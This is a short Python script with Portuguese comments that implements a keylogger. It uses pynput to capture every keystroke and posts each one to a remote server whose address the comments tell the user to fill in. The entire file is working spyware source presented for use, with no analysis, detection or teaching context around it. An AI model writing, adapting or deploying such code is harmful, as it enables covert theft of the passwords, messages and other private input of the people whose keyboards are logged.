import requests
from pynput.keyboard import Listener

# Configurar o URL do servidor
SERVER_URL = 'http://{IP_SERVER}/receive_keys'  # Substitua '{IP_SERVER}' pelo endereço do seu servidor

# Função para enviar a tecla pressionada para o servidor
def enviar_tecla(tecla):
    try:

        requests.post(SERVER_URL, data={'tecla': tecla})
    except Exception as e:
        print(f'Erro ao enviar tecla para o servidor: {e}')

# Função para registrar as teclas pressionadas
def on_press(key):
    try:
        if hasattr(key, 'char'):
            enviar_tecla(key.char)  # Envia apenas a tecla pressionada
        else:
            enviar_tecla(str(key))  # Envia outros tipos de teclas
    except Exception as e:
        print(f'Erro ao registrar tecla pressionada: {e}')

# Função para iniciar o keylogger
def iniciar_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    iniciar_keylogger()
